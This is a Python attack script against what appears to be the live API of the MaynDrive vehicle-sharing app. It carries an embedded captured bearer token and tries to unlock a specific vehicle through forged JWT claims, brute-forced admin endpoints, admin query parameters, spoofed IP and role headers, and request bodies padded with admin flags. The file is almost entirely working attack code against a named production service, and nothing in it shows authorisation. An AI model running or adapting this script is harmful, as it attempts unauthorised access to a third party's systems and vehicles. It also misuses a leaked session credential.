#!/usr/bin/env python3
"""
Privilege Escalation Attack on MaynDrive App
Comprehensive testing of various privilege escalation techniques
"""

import requests
import json
import time
import re
import base64
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_jwt_manipulation_escalation():
    """Test JWT token manipulation for privilege escalation"""
    print("=" * 80)
    print("[PRIVILEGE ESCALATION] JWT TOKEN MANIPULATION")
    print("=" * 80)
    print("[TARGET] Attempt to escalate privileges through JWT manipulation")
    print("=" * 80)
    
    # Extract JWT payload
    jwt_token = FRESH_TOKEN.replace("Bearer ", "")
    parts = jwt_token.split('.')
    
    if len(parts) != 3:
        print("[ERROR] Invalid JWT format")
        return False
    
    header, payload, signature = parts
    
    # Decode current payload
    try:
        # Add padding if needed
        payload_padded = payload + '=' * (4 - len(payload) % 4)
        decoded_payload = base64.urlsafe_b64decode(payload_padded).decode('utf-8')
        current_payload = json.loads(decoded_payload)
        print(f"[INFO] Current JWT payload: {current_payload}")
    except Exception as e:
        print(f"[ERROR] Failed to decode JWT: {e}")
        return False
    
    # Test different privilege escalation payloads
    escalation_payloads = [
        {
            "name": "Admin User ID",
            "payload": {**current_payload, "user_id": 1}
        },
        {
            "name": "Root User ID", 
            "payload": {**current_payload, "user_id": 0}
        },
        {
            "name": "Admin Role",
            "payload": {**current_payload, "role": "admin"}
        },
        {
            "name": "Superuser Role",
            "payload": {**current_payload, "role": "superuser"}
        },
        {
            "name": "Admin Scope",
            "payload": {**current_payload, "scope": "admin"}
        },
        {
            "name": "Admin Permissions",
            "payload": {**current_payload, "permissions": ["admin", "superuser"]}
        },
        {
            "name": "Admin Level",
            "payload": {**current_payload, "level": 999}
        },
        {
            "name": "Admin Flag",
            "payload": {**current_payload, "is_admin": True}
        },
        {
            "name": "Superuser Flag",
            "payload": {**current_payload, "is_superuser": True}
        },
        {
            "name": "Root Flag",
            "payload": {**current_payload, "is_root": True}
        },
        {
            "name": "Multiple Admin Flags",
            "payload": {
                **current_payload, 
                "is_admin": True,
                "is_superuser": True,
                "is_root": True,
                "role": "admin",
                "level": 999
            }
        }
    ]
    
    successful_escalations = []
    
    for test in escalation_payloads:
        print(f"\n[TEST] {test['name']}")
        print(f"   Modified payload: {test['payload']}")
        
        # Encode modified payload
        try:
            modified_payload_json = json.dumps(test['payload'], separators=(',', ':'))
            modified_payload_b64 = base64.urlsafe_b64encode(modified_payload_json.encode('utf-8')).decode('utf-8').rstrip('=')
            
            # Create modified JWT (keeping original signature - this will likely fail but worth testing)
            modified_jwt = f"{header}.{modified_payload_b64}.{signature}"
            modified_token = f"Bearer {modified_jwt}"
            
            print(f"   Modified token: {modified_token[:50]}...")
            
            # Test with unlock request
            headers = {
                "Authorization": modified_token,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "Accept": "application/json"
            }
            
            payload = {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522
            }
            
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                print(f"   [CRITICAL] PRIVILEGE ESCALATION ACHIEVED!")
                successful_escalations.append(test['name'])
            elif response.status_code == 401:
                print(f"   [BLOCKED] Token invalid/expired")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_escalations

def test_admin_endpoint_escalation():
    """Test various admin endpoints for privilege escalation"""
    print("\n" + "=" * 80)
    print("[PRIVILEGE ESCALATION] ADMIN ENDPOINT TESTING")
    print("=" * 80)
    print("[TARGET] Attempt to access admin endpoints")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test various admin endpoints
    admin_endpoints = [
        # Direct admin endpoints
        "/api/admin",
        "/api/admin/users",
        "/api/admin/vehicles",
        "/api/admin/sessions",
        "/api/admin/logs",
        "/api/admin/config",
        "/api/admin/system",
        "/api/admin/management",
        
        # Application admin endpoints
        "/api/application/admin",
        "/api/application/admin/users",
        "/api/application/admin/vehicles",
        "/api/application/admin/sessions",
        "/api/application/admin/logs",
        "/api/application/admin/config",
        "/api/application/admin/system",
        
        # Internal admin endpoints
        "/api/internal/admin",
        "/api/internal/users",
        "/api/internal/vehicles",
        "/api/internal/sessions",
        "/api/internal/logs",
        "/api/internal/config",
        "/api/internal/system",
        
        # System admin endpoints
        "/api/system/admin",
        "/api/system/users",
        "/api/system/vehicles",
        "/api/system/sessions",
        "/api/system/logs",
        "/api/system/config",
        "/api/system/management",
        
        # Root endpoints
        "/api/root",
        "/api/root/users",
        "/api/root/vehicles",
        "/api/root/sessions",
        "/api/root/logs",
        "/api/root/config",
        "/api/root/system",
        
        # Superuser endpoints
        "/api/super",
        "/api/super/users",
        "/api/super/vehicles",
        "/api/super/sessions",
        "/api/super/logs",
        "/api/super/config",
        "/api/super/system",
        
        # Master endpoints
        "/api/master",
        "/api/master/users",
        "/api/master/vehicles",
        "/api/master/sessions",
        "/api/master/logs",
        "/api/master/config",
        "/api/master/system"
    ]
    
    successful_endpoints = []
    
    for endpoint in admin_endpoints:
        print(f"\n[TEST] Admin endpoint: {endpoint}")
        
        try:
            # Test GET request
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   GET Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] GET access granted to {endpoint}!")
                successful_endpoints.append(f"{endpoint} (GET)")
                print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] GET permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] GET endpoint not found")
            else:
                print(f"   [INFO] GET Status {response.status_code}")
            
            # Test POST request
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json={"test": "admin_payload"},
                timeout=15
            )
            
            print(f"   POST Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] POST access granted to {endpoint}!")
                successful_endpoints.append(f"{endpoint} (POST)")
                print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] POST permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] POST endpoint not found")
            else:
                print(f"   [INFO] POST Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_endpoints

def test_query_parameter_escalation():
    """Test privilege escalation through query parameters"""
    print("\n" + "=" * 80)
    print("[PRIVILEGE ESCALATION] QUERY PARAMETER ESCALATION")
    print("=" * 80)
    print("[TARGET] Attempt privilege escalation through query parameters")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different query parameter combinations
    query_parameters = [
        "?admin=true",
        "?admin=1",
        "?admin=yes",
        "?admin=on",
        "?admin=enable",
        "?force=true",
        "?force=1",
        "?force=yes",
        "?scope=admin",
        "?scope=superuser",
        "?scope=root",
        "?role=admin",
        "?role=superuser",
        "?role=root",
        "?level=admin",
        "?level=999",
        "?permission=admin",
        "?permission=superuser",
        "?access=admin",
        "?access=superuser",
        "?privilege=admin",
        "?privilege=superuser",
        "?type=admin",
        "?type=superuser",
        "?mode=admin",
        "?mode=superuser",
        "?user_type=admin",
        "?user_type=superuser",
        "?is_admin=true",
        "?is_superuser=true",
        "?is_root=true",
        "?admin=true&force=true",
        "?admin=true&scope=admin",
        "?admin=true&role=admin",
        "?admin=true&level=999",
        "?admin=true&force=true&scope=admin&role=admin&level=999"
    ]
    
    successful_escalations = []
    
    for params in query_parameters:
        print(f"\n[TEST] Query parameters: {params}")
        
        endpoint = f"/api/application/vehicles/unlock{params}"
        print(f"   Endpoint: {endpoint}")
        
        payload = {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Privilege escalation via query parameters!")
                print(f"   [CRITICAL] ADMIN ACCESS ACHIEVED!")
                successful_escalations.append(params)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_escalations

def test_header_escalation():
    """Test privilege escalation through HTTP headers"""
    print("\n" + "=" * 80)
    print("[PRIVILEGE ESCALATION] HTTP HEADER ESCALATION")
    print("=" * 80)
    print("[TARGET] Attempt privilege escalation through HTTP headers")
    print("=" * 80)
    
    # Test different header combinations for privilege escalation
    header_tests = [
        {
            "name": "Admin User-Agent",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Admin-Tool v1.0",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Forwarded-For",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Forwarded-For": "127.0.0.1",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Real-IP",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Real-IP": "127.0.0.1",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Admin-Header",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Admin": "true",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Role-Header",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Role": "admin",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Scope-Header",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Scope": "admin",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Permission-Header",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Permission": "admin",
                "Accept": "application/json"
            }
        },
        {
            "name": "Admin X-Level-Header",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Knot-mayndrive v1.1.34 (android)",
                "X-Level": "999",
                "Accept": "application/json"
            }
        },
        {
            "name": "Multiple Admin Headers",
            "headers": {
                "Authorization": FRESH_TOKEN,
                "Content-Type": "application/json",
                "User-Agent": "Admin-Tool v1.0",
                "X-Admin": "true",
                "X-Role": "admin",
                "X-Scope": "admin",
                "X-Permission": "admin",
                "X-Level": "999",
                "Accept": "application/json"
            }
        }
    ]
    
    successful_escalations = []
    
    for test in header_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Headers: {json.dumps(test['headers'], indent=2)}")
        
        payload = {
            "serial_number": "SXB306",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=test['headers'],
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                print(f"   [CRITICAL] PRIVILEGE ESCALATION VIA HEADERS!")
                successful_escalations.append(test['name'])
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_escalations

def test_advanced_json_escalation():
    """Test advanced JSON payload manipulation for privilege escalation"""
    print("\n" + "=" * 80)
    print("[PRIVILEGE ESCALATION] ADVANCED JSON MANIPULATION")
    print("=" * 80)
    print("[TARGET] Advanced JSON payload manipulation for privilege escalation")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Advanced JSON escalation payloads
    escalation_payloads = [
        {
            "name": "Admin Override with Force",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "admin": True,
                "force": True,
                "bypass_validation": True,
                "skip_authorization": True,
                "override_checks": True
            }
        },
        {
            "name": "User ID Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "user_id": 1,
                "session_id": "admin-session",
                "impersonate_user": 1,
                "admin_user": True
            }
        },
        {
            "name": "Permission Array Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "permissions": ["admin", "superuser", "root", "unlock_all", "manage_all"],
                "roles": ["admin", "superuser", "root"],
                "capabilities": ["unlock_any_vehicle", "admin_access", "system_control"]
            }
        },
        {
            "name": "Level Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "level": 999,
                "access_level": "admin",
                "privilege_level": "superuser",
                "admin_level": "root"
            }
        },
        {
            "name": "Scope Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "scope": "admin",
                "access_scope": "superuser",
                "permission_scope": "root",
                "admin_scope": "system"
            }
        },
        {
            "name": "Flag Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "is_admin": True,
                "is_superuser": True,
                "is_root": True,
                "is_system": True,
                "admin_flag": True,
                "superuser_flag": True,
                "root_flag": True
            }
        },
        {
            "name": "Complete Admin Override",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "admin": True,
                "force": True,
                "bypass_validation": True,
                "skip_authorization": True,
                "override_checks": True,
                "user_id": 1,
                "session_id": "admin-session",
                "permissions": ["admin", "superuser", "root"],
                "roles": ["admin", "superuser", "root"],
                "level": 999,
                "scope": "admin",
                "is_admin": True,
                "is_superuser": True,
                "is_root": True
            }
        }
    ]
    
    successful_escalations = []
    
    for test in escalation_payloads:
        print(f"\n[TEST] {test['name']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                print(f"   [CRITICAL] PRIVILEGE ESCALATION ACHIEVED!")
                successful_escalations.append(test['name'])
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_escalations

def main():
    print("=" * 80)
    print("[PRIVILEGE ESCALATION] COMPREHENSIVE PRIVILEGE ESCALATION TESTING")
    print("=" * 80)
    print("[WARNING] Testing various privilege escalation techniques!")
    print("[TARGET] Attempt to gain admin/superuser privileges")
    print("=" * 80)
    
    # Run all privilege escalation tests
    jwt_results = test_jwt_manipulation_escalation()
    admin_endpoint_results = test_admin_endpoint_escalation()
    query_param_results = test_query_parameter_escalation()
    header_results = test_header_escalation()
    json_results = test_advanced_json_escalation()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] PRIVILEGE ESCALATION TEST RESULTS")
    print("=" * 80)
    
    print(f"\n[JWT MANIPULATION] Results:")
    if jwt_results:
        print(f"   [CRITICAL] {len(jwt_results)} JWT escalations successful: {jwt_results}")
    else:
        print(f"   [OK] JWT manipulation escalation failed")
    
    print(f"\n[ADMIN ENDPOINTS] Results:")
    if admin_endpoint_results:
        print(f"   [CRITICAL] {len(admin_endpoint_results)} admin endpoints accessible: {admin_endpoint_results}")
    else:
        print(f"   [OK] No admin endpoint access")
    
    print(f"\n[QUERY PARAMETERS] Results:")
    if query_param_results:
        print(f"   [CRITICAL] {len(query_param_results)} query parameter escalations: {query_param_results}")
    else:
        print(f"   [OK] Query parameter escalation failed")
    
    print(f"\n[HTTP HEADERS] Results:")
    if header_results:
        print(f"   [CRITICAL] {len(header_results)} header escalations: {header_results}")
    else:
        print(f"   [OK] Header escalation failed")
    
    print(f"\n[ADVANCED JSON] Results:")
    if json_results:
        print(f"   [CRITICAL] {len(json_results)} JSON escalations: {json_results}")
    else:
        print(f"   [OK] Advanced JSON escalation failed")
    
    # Overall assessment
    total_escalations = (len(jwt_results) + len(admin_endpoint_results) + 
                        len(query_param_results) + len(header_results) + 
                        len(json_results))
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total privilege escalations: {total_escalations}")
    
    if total_escalations > 0:
        print(f"   [CRITICAL] PRIVILEGE ESCALATION VULNERABILITIES CONFIRMED!")
        print(f"   [WARNING] Admin/superuser access possible!")
    else:
        print(f"   [OK] No privilege escalation vulnerabilities found")
        print(f"   [OK] Authorization controls appear to be working")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
